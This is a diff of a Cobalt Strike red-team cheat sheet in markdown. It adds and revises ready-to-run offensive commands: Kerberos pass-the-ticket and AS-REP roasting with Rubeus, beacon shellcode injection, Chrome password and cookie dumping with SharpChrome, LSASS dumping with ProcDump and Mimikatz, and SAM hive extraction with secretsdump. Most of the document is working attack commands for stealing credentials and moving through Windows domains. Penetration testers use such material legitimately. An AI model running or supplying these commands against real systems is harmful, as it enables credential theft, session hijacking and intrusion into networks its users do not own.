@@ -1,6 +1,8 @@
 # Cobalt Strike Red Team Cheat Sheet
----
-## C2 Profiles
+
+## Malleable C2 Profiles
+
+A collection of tools used to generate new malleable C2 profiles to use with Cobalt Strike and better obfuscate your traffic/commands.
 
 - [Random C2 Profile](https://github.com/threatexpress/random_c2_profile)
 - [Malleable C2](https://github.com/threatexpress/malleable-c2)
@@ -184,9 +186,10 @@ Inject a ticket into memory using known credentials and then move to a system th
 ```
 # Revert to original token in CS
 rev2self
-# Inject new ticket into memory
-execute-assembly C:\Rubeus.exe asktgt /domain:lab.com /user:admin1 /rc4:<NTLM hash> /ptt
+# Create and inject new ticket into memory
+execute-assembly C:\Rubeus.exe asktgt /domain:lab.com /user:admin1 /rc4:<NTLM-hash> /ptt
 # Run network commands as that user
+ls \\jumpbox.lab.com\C$
 jump winrm64 jumpbox.lab.com
 ```
 
@@ -213,7 +216,6 @@ execute-assembly SharpExec.exe -m=psexec -i=IPADDRESS -u=USER -p=PASSWORD -d=DOM
 execute-assembly SharpUp.exe audit # run all checks
 execute-assembly SharpUp.exe HijackablePaths # run individual check
 ```
-
 
 ------------------------------------------------------------------------------------------
 ## Domain Privilege Escalation
@@ -287,6 +289,16 @@ execute-assembly C:\Rubeus.exe kerberoast /outfile:KerbHashes.txt /domain:lab.co
 execute-assembly C:\Rubeus.exe kerberoast /outfile:KerbHash.txt /user:testaccount /domain:lab.com
 ```
 
+### AS-REP Roasting
+Target users in AD that do not require pre-authentication<br />
+```
+# AS-REP roast all users with Rubeus
+execute-assembly C:\Rubeus.exe asreproast /format:hashcat /outfile:C:\Temp\asrep-hashes.txt
+
+# AS-REP roast specific user with Rubeus
+execute-assembly C:\Rubeus.exe asreproast /user:testuser /format:hashcat /outfile:C:\Temp\asrep-hashes.txt
+```
+
 ------------------------------------------------------------------------------------------
 ## Defense Evasion
 
@@ -301,7 +313,7 @@ inject <PID> <x86|x64> HTTPSLISTENER
 shinect <PID> <x86|x64> C:\beacon.bin
 
 # Shellcode injection using Windows syscalls with [BOF script](https://github.com/ajpc500/BOFs)
-syscalls_shinject <PIX> C:\beacon.bin
+syscalls_shinject <PID> C:\beacon.bin
 ```
 
 ------------------------------------------------------------------------------------------
@@ -322,12 +334,21 @@ execute-assembly C:\SharpDPAPI.exe keepass /pvk:key.pvk /unprotect
 
 SharpChrome to extract and decrypt a user's Chrome sessions/passwords
 ```
+# Dump Chrome logins on the local system for the current user
+execute-assembly C:\SharpChrome.exe logins /unprotect
+
+# Dump Chrome cookies on the local system for the current user
+execute-assembly C:\SharpChrome.exe cookies
+
+# Dump Chrome cookies on the local system only for a specific URL - Output in JSON format to import into "Cookie Editor" browser extension
+execute-assembly C:\SharpChrome.exe cookies /format:json /browser:chrome /url:".*microsoft.com"
+
 # Dumping Chrome login passwords on remote machines using the domain backup key (can also use local user password)
 execute-assembly C:\SharpChrome.exe logins /pvk:key.pvk /server:SERVER.lab.com
 
 # Dumping and decryptiong Chrome user cookies and sessions on remote machines using the domain backup key (can also use local user password)
 # Cookies can then be imported into Chrome/Firefox using the extension Cookie-Editor
-execute-assembly C:\SharpChrome.exe cookies /pvk:key.pvk /server:SERVER.lab.com /format:json
+execute-assembly C:\SharpChrome.exe cookies /pvk:key.pvk /server:SERVER.lab.com
 ```
 
 ### [SharpWeb](https://github.com/djhohnstein/SharpWeb) - Retrieve saved credentials in Chrome, Firefox and Edge
@@ -337,10 +358,9 @@ execute-assembly C:\SharpWeb.exe all
 ```
 
 ### Active Directory Certificate Services (AD CS) Attack
-[Certify - GhostPack](https://github.com/GhostPack/Certify)
+[Certify - GhostPack](https://github.com/GhostPack/Certify) <br />
+Enumerate and abuse misconfigurations in AD CS <br />
 ```
-# Enumerate and abuse misconfigurations in AD CS
-
 # Find vulnerable certificates with Certify.exe
 execute-assembly C:\Certify.exe find /vulnerable /domain:lab.com
 
@@ -359,12 +379,12 @@ Mimikatz built-in to dump passwords/hashes to console
 # Works against most updated systems with AV/EDR if running as SYSTEM
 logonpasswords
 ```
-Dumping LSASS with ProcDump.exe (requires touching disk) (NOTE: Might get flagged by AV and raise alerts but will often still output dump file)
+Dumping LSASS with ProcDump.exe (requires touching disk) (NOTE: Might get flagged by AV and raise alerts but can still output LSASS dump file)
 ```
 upload --> ProcDump.exe
 run ProcDump.exe -accepteula -ma lsass.exe lsass.dmp
 ```
-Dumping LSASS with [Out-Minidump.ps from PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1) without touching disk
+Dumping LSASS with [Out-Minidump.ps1 from PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1) without touching disk
 ```
 powershell Get-Process | Out-Minidump -DumpFilePath C:\temp
 ```
@@ -372,26 +392,29 @@ Extract LSASS process with [SafetyKatz](https://github.com/GhostPack/SafetyKatz)
 ```
 execute-assembly C:\SafetyKatz.exe --> Dumps LSASS process to .dmp file on the local system
 ```
-Extracting passwords/hashes offline from LSASS dump using Mimikatz (ON YOUR OWN SYSTEM!)
+Extracting passwords/hashes offline from LSASS dump using Mimikatz (**ON YOUR OWN SYSTEM!**)
 ```
 mimikatz.exe log "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords /all" "sekurlsa::wdigest" exit (Run on your local box)
 ```
-SAM dump built in - Injects into LSASS to dump local SAM database hashes to console
+
+
+### SAM database dump 
+
+SAM dump built into CS - Injects into LSASS to dump local SAM database hashes to console
 ```
 hashdump
 ```
-
-### SAM database dump using reg.exe (requries local Admin)
+SAM dump using reg.exe
 ```
 run reg.exe save HKLM\sam sam.save
 run reg.exe save HKLM\security security.save
 run reg.exe save HKLM\system system.save
 
-# Download SAM files then dump hahses offline using Secretsdump.py
+# Download SAM files then dump hahses offline using Secretsdump.py 
 download sam.save
 download security.save
 download system.save
-python secretsdump.py -sam sam.save -security security.save -system system.save LOCAL (Run on your local box)
+python secretsdump.py -sam sam.save -security security.save -system system.save LOCAL (Run **ON YOUR OWN SYSTEM**)
 ```
 
 ### [SharpSecDump](https://github.com/G0ldenGunSec/SharpSecDump) SAM and LSA extraction
